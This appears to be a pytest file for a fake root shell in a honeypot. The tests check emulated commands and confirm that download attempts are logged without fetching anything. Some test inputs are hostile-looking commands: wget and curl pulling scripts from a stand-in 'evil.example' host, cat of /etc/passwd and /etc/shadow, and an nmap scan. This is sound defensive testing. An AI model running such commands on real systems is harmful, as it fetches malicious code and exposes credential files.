from fakeshell import FakeShell


def test_initial_state():
    shell = FakeShell()
    assert shell.cwd == "/root"
    assert shell.prompt() == "root@honeybadger:~# "


def test_pwd_and_whoami():
    shell = FakeShell()
    assert shell.dispatch("pwd").output == "/root"
    assert shell.dispatch("whoami").output == "root"


def test_id():
    assert "uid=0(root)" in FakeShell().dispatch("id").output


def test_uname():
    shell = FakeShell()
    assert shell.dispatch("uname").output == "Linux"
    detail = shell.dispatch("uname -a").output
    assert "Linux" in detail
    assert "honeybadger" in detail


def test_ls_lists_directory_entries():
    output = FakeShell().dispatch("ls").output
    assert "notes.txt" in output
    assert ".bashrc" not in output


def test_ls_shows_hidden_with_dash_a():
    assert ".bashrc" in FakeShell().dispatch("ls -a").output


def test_cd_changes_directory_and_prompt():
    shell = FakeShell()
    result = shell.dispatch("cd /tmp")
    assert result.cwd == "/tmp"
    assert shell.prompt() == "root@honeybadger:/tmp# "
    assert shell.dispatch("pwd").output == "/tmp"


def test_cd_dotdot():
    shell = FakeShell()
    shell.dispatch("cd /tmp")
    shell.dispatch("cd ..")
    assert shell.cwd == "/"


def test_cd_unknown_directory():
    shell = FakeShell()
    result = shell.dispatch("cd /nope")
    assert "No such file or directory" in result.output
    assert shell.cwd == "/root"


def test_cat_reads_fake_file():
    assert "root:x:0:0" in FakeShell().dispatch("cat /etc/passwd").output


def test_cat_missing_file_is_not_read_from_disk():
    # /etc/shadow exists on the real host but is not part of the fake FS.
    output = FakeShell().dispatch("cat /etc/shadow").output
    assert "No such file or directory" in output


def test_echo():
    assert FakeShell().dispatch("echo hello world").output == "hello world"


def test_unknown_command():
    result = FakeShell().dispatch("nmap 10.0.0.0/24")
    assert result.output == "bash: nmap: command not found"
    assert result.exit_requested is False


def test_history():
    shell = FakeShell()
    shell.dispatch("pwd")
    shell.dispatch("whoami")
    output = shell.dispatch("history").output
    assert "pwd" in output
    assert "whoami" in output


def test_exit_sets_flag():
    assert FakeShell().dispatch("exit").exit_requested is True
    assert FakeShell().dispatch("logout").exit_requested is True


def test_wget_records_payload_url_without_fetching():
    result = FakeShell().dispatch("wget http://evil.example/x.sh")
    assert result.payload_url == "http://evil.example/x.sh"
    assert "saved" in result.output


def test_curl_records_payload_url():
    result = FakeShell().dispatch("curl -sS http://evil.example/p.sh")
    assert result.payload_url == "http://evil.example/p.sh"


def test_non_download_command_has_no_payload_url():
    assert FakeShell().dispatch("ls").payload_url is None


def test_wget_without_url_is_rejected():
    result = FakeShell().dispatch("wget")
    assert result.payload_url is None
    assert "missing URL" in result.output


def test_empty_line():
    result = FakeShell().dispatch("   ")
    assert result.output == ""
    assert result.cwd == "/root"
